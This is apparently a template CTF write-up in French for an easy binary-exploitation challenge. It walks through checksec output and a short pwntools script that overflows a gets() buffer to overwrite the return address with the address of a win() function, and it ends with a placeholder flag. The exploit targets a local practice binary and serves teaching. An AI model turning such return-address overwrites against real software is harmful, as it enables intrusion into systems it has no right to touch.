# Pwn 101 - Buffer Overflow Basique

**Catégorie :** Pwn
**Difficulté :** Facile
**CTF :** Exemple CTF 2026

## Description

Le challenge fournit un binaire `vuln` avec une fonction `gets()` non protégée.
L'objectif est d'écraser l'adresse de retour pour rediriger l'exécution vers une fonction `win()`.

## Reconnaissance

```bash
file vuln
checksec --file=vuln
```

Résultat :

```
vuln: ELF 64-bit LSB executable, x86-64
NX enabled, No canary found, No PIE
```

## Exploitation

Le binaire ne dispose ni de canary ni de PIE, ce qui simplifie grandement l'exploitation.

1. Trouver l'offset jusqu'à l'adresse de retour avec `cyclic`
2. Récupérer l'adresse de la fonction `win()` avec `objdump`
3. Construire le payload

```python
from pwn import *

p = process("./vuln")
offset = 72
win_addr = 0x401196

payload = b"A" * offset + p64(win_addr)
p.sendline(payload)
p.interactive()
```

## Flag

> flag{exemple_de_flag_pour_demonstration}

## Conclusion

Ce challenge illustre les bases d'un buffer overflow classique sans protections.
Remplace ce fichier par tes vrais writeups dans `writeups/`.
